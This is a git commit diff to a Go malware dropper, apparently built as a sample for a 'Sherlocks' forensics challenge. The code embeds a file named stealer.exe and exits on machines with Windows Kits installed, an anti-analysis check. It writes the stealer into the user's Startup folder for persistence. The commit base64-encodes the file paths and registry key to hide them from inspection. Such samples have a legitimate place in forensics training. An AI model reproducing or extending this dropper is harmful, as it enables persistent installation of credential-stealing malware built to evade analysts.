f21d114cbae42068cf0b6a90a11eeb5a276d65bc
mylovemyon <102661460+mylovemyon@users.noreply.github.com>
2025-12-09 20:34:54 +0900

    Update dropper.go

--- Sherlocks/dropper.go
+++ Sherlocks/dropper.go
@@ -3,21 +3,44 @@ package main
 
 import (
 	"embed"
+	"encoding/base64"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"time"
+
+	"golang.org/x/sys/windows/registry"
 )
 
 //go:embed stealer.exe
 var embeddedFiles embed.FS
 
 func check() {
-	// check installed execl2016
-	excel_path := `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`
-	if _, err := os.Stat(excel_path); os.IsNotExist(err) {
-		os.Exit(1)
+	// check installed execl
+	encoded_path := "QzpcUHJvZ3JhbSBGaWxlc1xNaWNyb3NvZnQgT2ZmaWNlXHJvb3RcT2ZmaWNlMTZcRVhDRUwuRVhF"
+	decoded_path, err := base64.StdEncoding.DecodeString(encoded_path)
+	if err != nil {
+		return
 	}
+	if _, err := os.Stat(string(decoded_path)); os.IsNotExist(err) {
+		os.Exit(0)
+	}
+
+	// check installed windows kits
+	encoded_key := "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgS2l0c1xJbnN0YWxsZWQgUm9vdHM="
+	decoded_key, err := base64.StdEncoding.DecodeString(encoded_key)
+	if err != nil {
+		return
+	}
+	key, err := registry.OpenKey(
+		registry.LOCAL_MACHINE,
+		string(decoded_key),
+		registry.READ,
+	)
+	if err == nil {
+		os.Exit(0)
+	}
+	key.Close()
 }
 
 func hidden() []byte {
@@ -32,9 +55,14 @@ func hidden() []byte {
 func drop(data []byte) string {
 	// output stealer.exe to startup folder
 	appdata := os.Getenv("APPDATA")
-	startup := filepath.Join(appdata, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\stealer.exe")
+	encoded_path := "XE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxzdGVhbGVyLmV4ZQ=="
+	decoded_path, err := base64.StdEncoding.DecodeString(encoded_path)
+	if err != nil {
+		return ""
+	}
+	startup := filepath.Join(appdata, string(decoded_path))
 
-	err := os.WriteFile(startup, data, 0755)
+	err = os.WriteFile(startup, data, 0755)
 	if err != nil {
 		return ""
 	}
